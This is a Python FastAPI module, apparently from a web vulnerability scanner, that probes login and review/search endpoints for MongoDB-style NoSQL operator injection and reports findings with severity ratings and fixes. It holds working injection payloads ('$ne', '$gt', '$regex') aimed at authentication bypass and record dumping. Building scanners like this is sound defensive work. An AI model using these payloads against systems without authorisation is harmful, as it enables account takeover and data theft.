"""NoSQL Injection — MongoDB-style operator injection on auth + review endpoints."""
from fastapi import APIRouter, Depends
from tools._shared import (ScanRequest, verify_scan_quota, web_url,
                            safe_post, safe_request, wrap_finding, standard_response)
from tools._spa_state import load_spa_state

router = APIRouter()

_LOGIN_PATHS = [
    "/api/auth/login", "/api/login", "/rest/user/login",
    "/login", "/auth/login", "/api/v1/auth/login",
]
_REVIEW_PATHS = [
    "/rest/products/reviews",   # Juice Shop search-by-review (vulnerable to NoSQL)
    "/api/reviews",
    "/api/products/search",
    "/rest/products/search",
    "/api/search",
]
_LOGIN_PAYLOADS = [
    {"$ne": None},
    {"$gt": ""},
    {"$regex": ".*"},
]
_REVIEW_PAYLOADS = [
    {"$ne": "x"},
    {"$gt": ""},
]


def _is_auth_success(text):
    low = text.lower()
    return any(m in low for m in ('"token"', '"jwt"', '"access_token"',
                                   '"authentication"', '"sessionid"',
                                   '"bearer"'))


@router.post("/api/scan/nosql")
async def scan_nosql(req: ScanRequest, _=Depends(verify_scan_quota)):
    base = web_url(req.target).rstrip("/")
    spa = load_spa_state(req.target)

    # Build login candidates
    login_candidates = set(_LOGIN_PATHS)
    review_candidates = set(_REVIEW_PATHS)
    for url in (spa.get("endpoints") or {}).keys():
        path = url.replace(base, "") if url.startswith(base) else url
        if not path.startswith("/"):
            continue
        low = path.lower()
        if any(k in low for k in ("login", "auth", "signin")):
            login_candidates.add(path)
        elif any(k in low for k in ("review", "search", "query", "find")):
            review_candidates.add(path)

    findings, tests, confirmed = [], 0, []

    # ── Login bypass — operator-as-value POST JSON
    for path in list(login_candidates)[:6]:
        url = base + (path if path.startswith("/") else "/" + path)
        for payload in _LOGIN_PAYLOADS:
            tests += 1
            body = {"email": payload, "password": payload}
            r = safe_post(url, json=body, req=req,
                           headers={"Content-Type": "application/json"},
                           allow_redirects=False, timeout=10)
            if r is None or r.status_code not in (200, 201):
                continue
            if _is_auth_success(r.text or ""):
                findings.append(wrap_finding(
                    f"NoSQL Injection — auth bypass via operator on {path}",
                    "CRITICAL", cvss="9.8", cwe="CWE-943", owasp="A03:2021",
                    remediation=("Cast all auth inputs to string before passing to "
                               "the database driver. Reject non-string types on "
                               "email/password fields."),
                    evidence_marker=f"POST {path} JSON {{'email': {payload}, 'password': {payload}}} returned auth-success markers"))
                confirmed.append({"path": path, "kind": "login_bypass",
                                  "payload": str(payload), "status": r.status_code})
                break

    # ── Review/search exfiltration — operator returns "more" data
    for path in list(review_candidates)[:5]:
        url = base + (path if path.startswith("/") else "/" + path)
        # Baseline — empty / benign body
        baseline = safe_post(url, json={"query": "vulnuslab-canary-zzz"}, req=req,
                              headers={"Content-Type": "application/json"},
                              allow_redirects=False, timeout=10)
        baseline_len = len(baseline.content) if baseline is not None else 0
        for payload in _REVIEW_PAYLOADS:
            tests += 1
            body = {"query": payload, "id": payload, "search": payload}
            r = safe_post(url, json=body, req=req,
                           headers={"Content-Type": "application/json"},
                           allow_redirects=False, timeout=10)
            if r is None or r.status_code not in (200, 201):
                continue
            # If operator returned visibly more rows than baseline, NoSQL likely
            if len(r.content) > max(baseline_len * 2, 500):
                findings.append(wrap_finding(
                    f"NoSQL Injection — operator dumps records on {path}",
                    "HIGH", cvss="7.5", cwe="CWE-943", owasp="A03:2021",
                    remediation=("Sanitise + cast types on every search/filter input. "
                               "Reject non-string operators in user-controlled fields."),
                    evidence_marker=f"POST {path} with operator {payload} returned {len(r.content)} bytes vs {baseline_len} byte baseline"))
                confirmed.append({"path": path, "kind": "data_exfil",
                                  "payload": str(payload),
                                  "baseline_len": baseline_len,
                                  "probe_len": len(r.content)})
                break

    return standard_response(tool="nosql", target=req.target, findings=findings,
        tests_performed=tests,
        tests_summary=(f"NoSQL: {tests} probes across {len(login_candidates)} login + "
                       f"{len(review_candidates)} review/search endpoints"),
        raw_data={"nosql": {"confirmed": confirmed}})


def register(app):
    app.include_router(router)
